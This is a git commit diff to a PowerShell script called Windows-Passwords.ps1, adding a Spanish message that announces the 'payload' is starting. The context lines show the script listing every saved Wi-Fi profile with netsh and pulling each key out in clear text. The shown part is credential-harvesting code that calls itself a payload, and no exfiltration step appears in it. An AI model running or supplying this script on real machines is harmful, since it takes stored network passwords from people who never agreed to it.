2fc7e2366379cb4ff846d1b361b99b4c20eaf0c5
Javi Rufo <150443755+javirufo-ies@users.noreply.github.com>
2025-12-10 08:35:58 +0100

    Add starting message to Windows-Passwords.ps1
    Add output message indicating payload start

--- Windows-Passwords.ps1
+++ Windows-Passwords.ps1
@@ -1,3 +1,4 @@
+Write-Output "Comenzando payload"
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
     $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
